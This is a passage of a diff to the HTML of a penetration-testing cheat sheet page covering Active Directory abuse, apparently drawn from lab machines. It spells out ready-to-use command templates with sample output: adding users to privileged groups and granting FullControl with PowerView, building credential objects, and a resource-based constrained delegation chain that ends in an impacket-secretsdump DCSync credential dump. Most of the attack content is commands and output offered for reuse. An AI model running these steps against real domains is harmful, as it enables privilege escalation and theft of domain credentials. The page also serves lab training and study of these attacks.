class="o">&lt;USER&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainGroupMember -Identity &#39;servicemgmt&#39;
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity '<span class="o">&lt;GROUP&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainGroupMember -Identity 'servicemgmt'
 </span></span></span><span class="line"><span class="cl"><span class="go">GroupDomainName             : ServiceMgmt
 </span></span></span><span class="line"><span class="cl"><span class="go">GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
 </span></span></span><span class="line"><span class="cl"><span class="go">MemberDomain                : rebound.htb
@@ -561,17 +558,19 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">MemberName                  : oorend
 </span></span></span><span class="line"><span class="cl"><span class="go">MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
 </span></span></span><span class="line"><span class="cl"><span class="go">MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
-</span></span></span></code></pre></div><h4 id="4-add-fullcontrol-over-target-group">4. Add Fullcontrol over Target Group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exit and login again to apply changes
-</span></span><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity &#39;&lt;TARGET_GROUP&gt;&#39; -PrincipalIdentity &#39;&lt;USER&gt;&#39; -Rights fullcontrol
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainObjectAcl -TargetIdentity &#39;service users&#39; -PrincipalIdentity &#39;oorend&#39; -Rights fullcontrol
+</span></span></span></div></pre></div><h4 id="4-add-fullcontrol-over-target-group">4. Add Fullcontrol over Target Group</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exit and login again to apply changes
+</span></span><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity '<span class="o">&lt;TARGET_GROUP&gt;</span>' -PrincipalIdentity '<span class="o">&lt;USER&gt;</span>' -Rights fullcontrol
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oorend' -Rights fullcontrol
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] [Add-DomainObjectACL] Found principal identity: CN=oorend,CN=Users,DC=rebound,DC=htb
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
 </span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] DACL modified successfully!
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainObjectAcl -Identity &#39;&lt;TARGET_USER&gt;&#39; -Where &#39;SecurityIdentifier contains &lt;USER&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainObjectAcl -Identity &#39;winrm_svc&#39; -Where &#39;SecurityIdentifier contains oorend&#39;
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainObjectAcl -Identity '<span class="o">&lt;TARGET_USER&gt;</span>' -Where 'SecurityIdentifier contains <span class="o">&lt;USER&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainObjectAcl -Identity 'winrm_svc' -Where 'SecurityIdentifier contains oorend'
 </span></span></span><span class="line"><span class="cl"><span class="go">ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
 </span></span></span><span class="line"><span class="cl"><span class="go">ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
 </span></span></span><span class="line"><span class="cl"><span class="go">ACEType                     : ACCESS_ALLOWED_ACE
@@ -580,26 +579,34 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">AccessMask                  : 0xf01ff
 </span></span></span><span class="line"><span class="cl"><span class="go">InheritanceType             : None
 </span></span></span><span class="line"><span class="cl"><span class="go">SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></em></small></p></div></p>
-<h3 id="abuse-4--add-self-to-group-from-windows">Abuse #4 : Add Self to Group (From Windows)</h3>
-<p>
-<button data-tabset="set5" data-tabcontent="tab1" >Windows</button>
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></em></small></p></div></div>
 
-<div class="tabcontent" data-tabset="set5" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1
-</span></span></span></code></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a Cred Object (runas) [Optional]</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
-</span></span></code></pre></div><h4 id="3-add-self-to-group">3. Add Self to Group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39; -Members &#39;&lt;USER&gt;&#39; -Credential $Cred
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Add-DomainGroupMember -Identity &#39;security engineers&#39; -Members &#39;user&#39; -Credential $Cred
-</span></span></span><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &#39;security engineers&#39; -Members &#39;user&#39; -Credential $Cred
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainGroupMember -Identity &#39;security engineers&#39;
-</span></span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &#39;security engineers&#39;
+<p></p>
+<h3 id="abuse-4--add-self-to-group-from-windows">Abuse #4 : Add Self to Group (From Windows)</h3>
+<p class="tabs">
+<button data-tabset="set5" data-tabcontent="tab1" class="active">Windows</button>
+
+</p><div class="tabset-wrapper" data-tabset-group="set5"><div class="tabcontent active" data-tabset="set5" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1
+</span></span></span></div></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a Cred Object (runas) [Optional]</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">'<span class="o">&lt;DOMAIN&gt;</span>\<span class="o">&lt;USER&gt;</span>'</span>
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'<span class="o">&lt;PASSWORD&gt;</span>'</span> -AsPlainText -Force
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="3-add-self-to-group">3. Add Self to Group</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity '<span class="o">&lt;GROUP&gt;</span>' -Members '<span class="o">&lt;USER&gt;</span>' -Credential $Cred
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
+</span></span></span><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity '<span class="o">&lt;GROUP&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainGroupMember -Identity 'security engineers'
+</span></span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity 'security engineers'
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
@@ -611,30 +618,33 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">MemberDistinguishedName : CN=user,OU=Contractors,OU=Corp,DC=corp,DC=local
 </span></span></span><span class="line"><span class="cl"><span class="go">MemberObjectClass       : user
 </span></span></span><span class="line"><span class="cl"><span class="go">MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
-</span></span></span></code></pre></div></div></p>
+</span></span></span></div></pre></div></div></div><p></p>
 <hr>
 <h3 id="abuse-5--rbcd-attack-genericwrite-over-dc">Abuse #5 : RBCD Attack (GenericWrite over DC)</h3>
-<p>
-<button data-tabset="set6" data-tabcontent="tab1" >Linux</button>
+<p class="tabs">
+<button data-tabset="set6" data-tabcontent="tab1" class="active">Linux</button>
 
-<div class="tabcontent" data-tabset="set6" data-tabcontent="tab1"><h4 id="1-rbcd-attack">1. RBCD Attack</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-rbcd -delegate-to &#39;&lt;TARGET_COMPUTER&gt;$&#39; -delegate-from &#39;&lt;USER&gt;&#39; -dc-ip &lt;DC_IP&gt; -action &#39;write&#39; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><h4 id="2-impersonate">2. Impersonate</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-getST -spn cifs/&lt;TARGET_DOMAIN&gt; -impersonate &lt;TARGET_USER&gt; -dc-ip &lt;DC_IP&gt; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><h4 id="3-import-ticket">3. Import Ticket</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&#39;&lt;USER&gt;@cifs_&lt;TARGET_DOMAIN&gt;@&lt;DOMAIN&gt;.ccache&#39;
-</span></span></span></code></pre></div><h4 id="4-dcsync-attack">4. DCSync Attack</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump &#39;&lt;USER&gt;@&lt;TARGET_DOMAIN&gt;&#39; -k -no-pass
-</span></span></span></code></pre></div></div></p>
+</p><div class="tabset-wrapper" data-tabset-group="set6"><div class="tabcontent active" data-tabset="set6" data-tabcontent="tab1"><h4 id="1-rbcd-attack">1. RBCD Attack</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-rbcd -delegate-to '<span class="o">&lt;TARGET_COMPUTER&gt;</span>$' -delegate-from '<span class="o">&lt;USER&gt;</span>' -dc-ip <span class="o">&lt;DC_IP&gt;</span> -action 'write' '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;USER&gt;</span>:<span class="o">&lt;PASSWORD&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="2-impersonate">2. Impersonate</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-getST -spn cifs/<span class="o">&lt;TARGET_DOMAIN&gt;</span> -impersonate <span class="o">&lt;TARGET_USER&gt;</span> -dc-ip <span class="o">&lt;DC_IP&gt;</span> '<span class="o">&lt;DOMAIN&gt;</span>/<span class="o">&lt;USER&gt;</span>:<span class="o">&lt;PASSWORD&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="3-import-ticket">3. Import Ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME='<span class="o">&lt;USER&gt;</span>@cifs_<span class="o">&lt;TARGET_DOMAIN&gt;</span>@<span class="o">&lt;DOMAIN&gt;</span>.ccache'
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="4-dcsync-attack">4. DCSync Attack</h4>
